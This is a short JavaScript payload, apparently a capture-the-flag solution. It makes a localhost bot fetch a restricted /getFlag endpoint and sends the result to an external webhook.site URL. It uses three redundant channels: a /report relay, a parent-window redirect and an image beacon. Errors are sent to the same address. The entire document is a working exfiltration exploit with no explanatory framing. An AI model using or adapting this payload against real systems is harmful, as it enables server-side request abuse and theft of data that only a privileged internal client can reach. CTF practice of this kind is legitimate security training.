(function() {
    // /getFlag only allows 127.0.0.1 — bot runs on localhost so this works
    fetch('http://127.0.0.1:9003/getFlag', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ giveMe: 'theFlag' })
    })
    .then(r => r.text())
    .then(function(flag) {
        var exfilUrl = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb/?flag=' 
            + encodeURIComponent(flag);

        // Method 1: relay through /report
        fetch('http://127.0.0.1:9003/report?url=' + encodeURIComponent(exfilUrl));

        // Method 2 (backup): navigate parent directly
        window.parent.location.href = exfilUrl;

        // Method 3 (backup): img tag
        var img = new Image();
        img.src = exfilUrl;
        document.body.appendChild(img);
    })
    .catch(function(err) {
        // Exfil the error too so you can debug
        var errUrl = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb/?error=' 
            + encodeURIComponent(err.toString());
        window.parent.location.href = errUrl;
    });
})();
